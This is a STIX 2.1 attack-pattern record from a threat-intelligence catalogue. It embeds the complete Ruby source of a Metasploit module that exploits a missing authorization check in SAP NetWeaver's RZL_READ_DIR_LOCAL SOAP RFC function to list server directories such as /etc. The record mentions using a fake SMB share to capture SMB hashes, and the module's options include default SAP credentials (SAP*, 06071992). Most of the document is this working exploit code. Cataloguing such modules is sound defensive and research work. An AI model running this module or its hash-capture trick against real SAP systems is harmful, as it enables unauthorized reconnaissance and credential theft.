{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--79752bef-6ebf-4004-8be2-a57e8ca942a3",
    "created": "2024-08-14T16:27:01.288086Z",
    "modified": "2024-08-14T16:27:01.28809Z",
    "name": "SAP SOAP RFC RZL_READ_DIR_LOCAL Directory Contents Listing",
    "description": " This module exploits the SAP NetWeaver RZL_READ_DIR_LOCAL function, on the SAP SOAP RFC Service, to enumerate directory contents. It returns only the first 32 characters of the filename since they are truncated. The module can also be used to capture SMB hashes by using a fake SMB share as DIR.  'References' => [ [ 'OSVDB', '92732']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/sap/sap_soap_rfc_rzl_read_dir.rb",
            "external_id": "sap_soap_rfc_rzl_read_dir.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n##\n# This module is based on, inspired by, or is a port of a plugin available in\n# the Onapsis Bizploit Opensource ERP Penetration Testing framework -\n# http://www.onapsis.com/research-free-solutions.php.\n# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts\n# in producing the Metasploit modules and was happy to share his knowledge and\n# experience - a very cool guy.\n#\n# The following guys from ERP-SCAN deserve credit for their contributions -\n# Alexandr Polyakov, Alexey Sintsov, Alexey Tyurin, Dmitry Chastukhin and\n# Dmitry Evdokimov.\n#\n# I'd also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis\n# who have Beta tested the modules and provided excellent feedback. Some people\n# just seem to enjoy hacking SAP :)\n##\n\nrequire 'rexml/document'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name' => 'SAP SOAP RFC RZL_READ_DIR_LOCAL Directory Contents Listing',\n      'Description' => %q{\n          This module exploits the SAP NetWeaver RZL_READ_DIR_LOCAL function, on the SAP\n        SOAP RFC Service, to enumerate directory contents. It returns only the first 32\n        characters of the filename since they are truncated. The module can also be used to\n        capture SMB hashes by using a fake SMB share as DIR.\n      },\n      'References' => [\n        [ 'OSVDB', '92732'],\n        [ 'URL', 'http://erpscan.com/advisories/dsecrg-12-026-sap-netweaver-rzl_read_dir_local-missing-authorization-check-and-smb-relay-vulnerability/' ]\n      ],\n      'Author' =>\n        [\n          'Alexey Tyurin', # Vulnerability discovery\n          'nmonkee' # Metasploit module\n        ],\n      'License' => MSF_LICENSE\n    )\n\n    register_options([\n      OptString.new('CLIENT', [true, 'SAP Client', '001']),\n      OptString.new('HttpUsername', [true, 'Username', 'SAP*']),\n      OptString.new('HttpPassword', [true, 'Password', '06071992']),\n      OptString.new('DIR',[true,'Directory path (e.g. /etc)','/etc'])\n    ])\n  end\n\n  def parse_xml(xml_data)\n    files = []\n    xml_doc = REXML::Document.new(xml_data)\n    xml_doc.root.each_element('//item') do |item|\n      name = size = nil\n      item.each_element do |elem|\n        name = elem.text if elem.name == \"NAME\"\n        size = elem.text if elem.name == \"SIZE\"\n        break if name and size\n      end\n      if (name and size) and not (name.empty? or size.empty?)\n        files << { \"name\" => name, \"size\" => size }\n      end\n    end\n    return files\n  end\n\n  def run_host(ip)\n    data = '<?xml version=\"1.0\" encoding=\"utf-8\" ?>'\n    data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:soap=\"http://schemas.xmlsoap.org/wsdl/soap/\"  '\n    data << 'xmlns:xsd=\"http://www.w3.org/1999/XMLSchema\"  xmlns:xsi=\"http://www.w3.org/1999/XMLSchema-instance\"  xmlns:m0=\"http://tempuri.org/\"  '\n    data << 'xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\">'\n    data << '<SOAP-ENV:Header/>'\n    data << '<SOAP-ENV:Body>'\n    data << '<RZL_READ_DIR_LOCAL xmlns=\"urn:sap-com:document:sap:rfc:functions\">'\n    data << '<FILE_TBL>'\n    data << '<item>'\n    data << '<NAME></NAME>'\n    data << '<SIZE></SIZE>'\n    data << '</item>'\n    data << '</FILE_TBL>'\n    data << '<NAME>' + datastore['DIR'] + '</NAME>'\n    data << '</RZL_READ_DIR_LOCAL>'\n    data << '</SOAP-ENV:Body>'\n    data << '</SOAP-ENV:Envelope>'\n\n    begin\n      vprint_status(\"#{rhost}:#{rport} - Sending request to enumerate #{datastore['DIR']}\")\n      res = send_request_cgi({\n        'uri' => '/sap/bc/soap/rfc',\n        'method' => 'POST',\n        'data' => data,\n        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),\n        'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],\n        'ctype' => 'text/xml; charset=UTF-8',\n        'headers' => {\n          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',\n        },\n        'vars_get' => {\n          'sap-client' => datastore['CLIENT'],\n          'sap-language' => 'EN'\n        }\n      })\n      if res and res.code == 200 and res.body =~ /rfc:RZL_READ_DIR_LOCAL.Response/\n        files = parse_xml(res.body)\n        path = store_loot(\"sap.soap.rfc.dir\", \"text/xml\", rhost, res.body, datastore['DIR'])\n        print_good(\"#{rhost}:#{rport} - #{datastore['DIR']} successfully enumerated, results stored on #{path}\")\n        files.each { |f|\n          vprint_line(\"Entry: #{f[\"name\"]}, Size: #{f[\"size\"].to_i}\")\n        }\n      end\n    rescue ::Rex::ConnectionError\n      vprint_error(\"#{rhost}:#{rport} - Unable to connect\")\n      return\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}